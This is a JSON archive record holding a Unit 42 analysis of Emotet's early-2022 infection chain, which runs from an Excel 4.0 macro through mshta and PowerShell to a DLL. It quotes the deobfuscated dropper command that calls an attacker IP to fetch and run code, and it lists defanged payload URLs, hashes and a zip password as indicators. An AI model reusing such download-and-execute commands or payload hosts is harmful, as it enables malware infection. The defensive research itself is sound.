{
    "id": "b413272c-4c35-4fc8-ab5c-ee6f4d38cca7",
    "created_at": "2023-01-12T15:08:47.868309Z",
    "updated_at": "2025-03-27T02:05:34.444047Z",
    "deleted_at": null,
    "sha1_hash": "4d75baae328c6ea1bb4e6cbc3c704ef6fa5de8c1",
    "title": "2022-02-15 - New Emotet Infection Method",
    "authors": "",
    "file_creation_date": "2022-05-28T03:53:05Z",
    "file_modification_date": "2022-05-28T03:53:05Z",
    "file_size": 1370478,
    "plain_text": "# New Emotet Infection Method\n\n**[unit42.paloaltonetworks.com/new-emotet-infection-method/](https://unit42.paloaltonetworks.com/new-emotet-infection-method/)**\n\nSaqib Khanzada, Tyler Halfpop, Micah Yates, Brad Duncan February 15, 2022\n\nBy [Saqib Khanzada,](https://unit42.paloaltonetworks.com/author/saqib-khanzada/) [Tyler Halfpop,](https://unit42.paloaltonetworks.com/author/tyler-halfpop/) [Micah Yates and](https://unit42.paloaltonetworks.com/author/micah-yates/) [Brad Duncan](https://unit42.paloaltonetworks.com/author/bduncan/)\n\nFebruary 15, 2022 at 6:00 AM\n\n[Category: Malware](https://unit42.paloaltonetworks.com/category/malware-2/)\n\nTags: [Emotet,](https://unit42.paloaltonetworks.com/tag/emotet/) [Macros,](https://unit42.paloaltonetworks.com/tag/macros/) [Phishing,](https://unit42.paloaltonetworks.com/tag/phishing/) [Windows](https://unit42.paloaltonetworks.com/tag/windows/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/new-emotet-infection-method/)\n\n## Executive Summary\n\nAs early as Dec. 21, 2021, Unit 42 observed a new infection method for the highly prevalent\nmalware family Emotet. Emotet is high-volume malware that often changes and modifies its\nattack patterns. This latest modification of the Emotet attack follows suit.\n\nThe new attack delivers an Excel file through email, and the document contains an\nobfuscated Excel 4.0 macro. When the macro is activated, it downloads and executes an\nHTML application that downloads two stages of PowerShell to retrieve and execute the final\nEmotet payload.\n\n\n-----\n\nPalo Alto Networks customers are protected from Emotet and similar malware families using\n[similar obfuscation techniques with Cortex XDR or the](https://www.paloaltonetworks.com/cortex/cortex-xdr) [Next-Generation Firewall with the](https://www.paloaltonetworks.com/network-security/next-generation-firewall)\n[WildFire and](https://www.paloaltonetworks.com/products/secure-the-network/wildfire) [Threat Prevention security subscriptions.](https://www.paloaltonetworks.com/network-security/threat-prevention)\n\nPrimary Malware Discussed [Emotet](https://unit42.paloaltonetworks.com/tag/Emotet/)\n\nOperating System Affected Windows\n\nRelated Unit 42 Topics [Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [macros,](https://unit42.paloaltonetworks.com/tag/macros/) [phishing](https://unit42.paloaltonetworks.com/tag/phishing/)\n\n## Table of Contents\n\nHistory of Emotet\n\nExample of an Initial Email Lure\n\nExcel Document\n\nPowerShell\n\nConclusion\n\nIndicators of Compromise\n\n## History of Emotet\n\nEmotet was first discovered as a banking trojan in 2014, and it has been very active in recent\nyears. In January 2021, law enforcement and judicial agencies took down the Emotet botnet\ninfrastructure, but Emotet [returned in November 2021 and has remained active since then.](https://isc.sans.edu/forums/diary/Emotet+Returns/28044/)\n\nEmotet frequently uses thread hijacking as part of its attack method. As described in our\nprevious blog on Emotet’s thread hijacking, this technique generates fake replies based on\nlegitimate emails stolen from mail clients of Windows hosts previously infected with Emotet.\nThe botnet uses this stolen email data to create fake replies impersonating the original\nsenders.\n\nUsing thread hijacking and other types of emails, Emotet has implemented different infection\nmethods since its return. Most notable were emails with links to install a fake Adobe\nWindows App Installer Package in December 2021. After a holiday break, Emotet returned to\nattachment-based emails in January 2022. As early as Dec. 21, 2021, Emotet started using a\nnew infection method, which we describe in this blog.\n\nIn some cases, Emotet uses a password-protected zip archive as an attachment to its email.\nIn other cases, Emotet uses an Excel spreadsheet directly attached to the email.\n\n## Example of an Initial Email Lure\n\n\n-----\n\nShown in Figure 1, this example of an initial email lure sent by Emotet is a recent example of\nEmotet’s thread hijacking. The stolen email thread is from June 2021, and this email was\nsent by the Emotet botnet on Jan. 27, 2022. This example contains an encrypted zip file in\nan attempt to bypass security systems. The password to the zip file is included in the email,\nso that the victim can extract the contents.\n\nFigure\n\n1. Example of a thread-hijacked Emotet email lure sent on Jan. 27, 2022.\n\n\n-----\n\n## Excel Document\n\nThe encrypted zip file contains a single Excel document with Excel 4.0 macros. These\nmacros are an old Excel feature that is frequently abused by malicious actors. The victim\nmust enable macros on a vulnerable Windows host before the malicious content is activated.\n\nFigure 2. Excel 4.0 macro document.\nWhen the macro code is enabled, it executes cmd.exe to run mshta.exe with an argument to\nretrieve and execute a remote HTML application. The code utilizes hex and character\nobfuscation in order to attempt to bypass static detection measures. The deobfuscated\ncommand string that is executed is: cmd /c mshta hxxp://91.240.118[.]168/se/s.html\n\nFigure 3. Excel 4.0 macro code that executes cmd and mshta.\nThe HTML application shown in Figure 4 is highly obfuscated. It will download and execute\nadditional PowerShell code.\n\n\n-----\n\nFigure 4. Obfuscated HTML application.\n\n## PowerShell\n\nThe initial obfuscated PowerShell script shown in Figure 5 connects to\nhxxp://91.240.118[.]168/se/s.png. This URL returns text-based script for a second-stage set\nof PowerShell code designed to retrieve an Emotet binary.\n\nFigure 5. Initial PowerShell downloader.\nThis second-stage PowerShell code shown in Figure 6 contains 14 URLs to retrieve the\nEmotet binary. The script attempts each URL until an Emotet binary is successfully\ndownloaded. Having multiple URLs makes this attack more resilient in the event that one of\nthe URLs is taken down.\n\n\n-----\n\nFigure 6. HTTP traffic showing the second-stage PowerShell code.\nThe Emotet DLL loads an encrypted PE from its resource section as the final stage of this\nattack chain.\n\nFigure 7. Emotet DLL with an encrypted PE from its resource section.\n\n\n-----\n\n## Conclusion\n\nEmotet is a highly-active malware family that frequently changes its infection techniques.\nThese changes are likely an attempt to avoid detection. Emotet’s new attack chain reveals\nmultiple stages with different file types and obfuscated script before arriving at the final\nEmotet payload.\n\nPalo Alto Networks customers are protected from malware families using similar obfuscation\ntechniques with Cortex XDR or the Next-Generation Firewall with WildFire and Threat\nPrevention security subscriptions.\n\n## Indicators of Compromise\n\n### Appendix A: Files From Emotet Email Lure on Jan. 27, 2022\n\nSHA256 hash: 9f22626232934970e4851467b7b746578f0f149984cd0e4e1a156b391727fac9\n\nFile size: 40,929 bytes\n\nFile name: form.zip\n\nFile description: Password-protected encrypted zip archive seen on Jan. 27, 2022\n\nPassword: EHGWQARLC\n\nSHA256 hash:\n6d55f25222831cce73fd9a64a8e5a63b002522dc2637bd2704f77168c7c02d88\n\nFile size: 77,989 bytes\n\nFile name: form.xlsm\n\nFile description: Excel file with Excel 4.0 macros extracted from the above zip archive\n\n### Appendix B: PowerShell Script Seen on Jan. 27, 2022\n\nSHA256 hash: 9bda03babb0f2c6aa9861eca95b33af06a650e2851cce4edcc1fc3abd8e7c2a1\n\nFile size: 10,986 bytes\n\nFile location: hxxp://91.240.118[.]168/se/s.html\n\nFile description: First-stage PowerShell script\n\nSHA256 hash: 5bd4987db7e6946bf2ca3f73e17d6f75e2d8217df63b2f7763ea9a6ebcaf9fed\n\nFile size: 1,353 bytes\n\nFile location: hxxp://91.240.118[.]168/se/s.png\n\nFile description: Second-stage PowerShell script\n\n### Appendix C: URLs Hosting the Emotet DLL on Jan. 27, 2022\n\nhxxp://unifiedpharma[.]com/wp-content/5arxM/\n\nhxxp://hotelamerpalace[.]com/Fox-C404/LEPqPJpt4Gbr8BHAn/\n\nhxxps://connecticutsfinestmovers[.]com/Fox-C/mVwOqxT17gVWaE8E/\n\n\n-----\n\nhxxp://icfacn[.]com/runtime/n7qA2YStudp/\nhxxps://krezol-group[.]com:443/images/PmLGLKYeCBs5d/\nhxxp://ledcaopingdeng[.]com/wp-includes/Qq39yj7fpvk/\nhxxp://autodiscover.karlamejia[.]com/wp-admin/hcdnVlRIiwvTVrJjJEE/\nhxxps://crmweb[.]info:443/bitrix/rc9XjtwF/\nhxxp://accessunited-bank[.]com/admin/hzIgVwq8btak/\nhxxp://pigij[.]com/wp-admin/MVW5/\nhxxp://artanddesign[.]one/wp-content/uploads/A2cZL7/\nhxxp://strawberry.kids-singer[.]net/assets_c/WAdvNT84Dmu/\nhxxps://eleccom[.]shop:443/services/AEjSDj/\nhxxps://izocab[.]com/nashi-klienty/B5SC/\n\n### Appendix D: Example of Emotet DLL on Jan. 27, 2022\n\nSHA256 hash: 2de72908e0a1ef97e4e06d8b1ba3dc0d76f580cdf36f96b5c919bea770b2805f\n\nFile size: 516,096 bytes\n\nFile location: hxxp://unifiedpharma[.]com/wp-content/5arxM/\n\nFile location: C:\\Users\\Public\\Documents\\ssd.dll\n\nFile location: C:\\Users\\[username]\\AppData\\Local\\[random characters]\\[random characters].\n\n[random characters]\n\nRun method: rundll32.exe [filename],[any string]\n\n_Updated Feb. 15, 2022, to list earlier dates of initial observation of the infection method._\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-15 - New Emotet Infection Method.pdf"
    ],
    "report_names": [
        "2022-02-15 - New Emotet Infection Method.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536127,
    "ts_updated_at": 1743041134,
    "ts_creation_date": 1653709985,
    "ts_modification_date": 1653709985,
    "files": {
        "pdf": "https://archive.orkl.eu/4d75baae328c6ea1bb4e6cbc3c704ef6fa5de8c1.pdf",
        "text": "https://archive.orkl.eu/4d75baae328c6ea1bb4e6cbc3c704ef6fa5de8c1.txt",
        "img": "https://archive.orkl.eu/4d75baae328c6ea1bb4e6cbc3c704ef6fa5de8c1.jpg"
    }
}